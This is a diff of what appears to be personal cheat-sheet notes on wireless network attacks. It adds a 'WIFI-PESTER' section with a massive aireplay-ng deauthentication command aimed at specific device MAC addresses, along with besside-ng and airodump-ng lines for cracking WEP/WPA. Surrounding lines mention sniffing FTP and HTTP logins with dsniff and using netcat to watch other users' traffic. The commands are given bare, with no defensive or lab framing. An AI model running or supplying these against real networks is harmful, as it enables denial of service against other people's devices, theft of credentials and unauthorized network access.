@@ -2,9 +2,11 @@
 
 
 ----------------------------------------------------CONNECTING[HEADLESS]-----------------------------------------
-$ nmcli device wifi list 
+nmcli device wifi list 
 
 netdiscover -r 192.168.50.1/24
+
+
 dsniff --> slowly sniffs for senstive data (ftp http logins) 
 nmcli device wifi connect "MyWiFiNetwork" password "wifiPassword"
 ip address show
@@ -208,6 +210,14 @@ dsniff - [practically snniffing for any password (FTP HTTP) WHILE ON NETWORK MDO
 
 netcat [nc] --> [is a creepy, it can be used to follow you oce or persisant follwig you with a fwe commands. it can watch you upload/download or do anything on the networkthat hpersists) 
 
+------------------------------------------------------ WIFI-PESTER ------------------------------------------------------
+
+netdiscover -r 192.168.50.1/24
+aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
+
+### CRACKING WEP / WPA ####
+besside-ng en0 -c 6 -b
+airodump-ng wlx0013eff5483f --encrypt wep
 
 
 ------------------------------------------------------ BLUETOOTHNESS ------------------------------------------------------
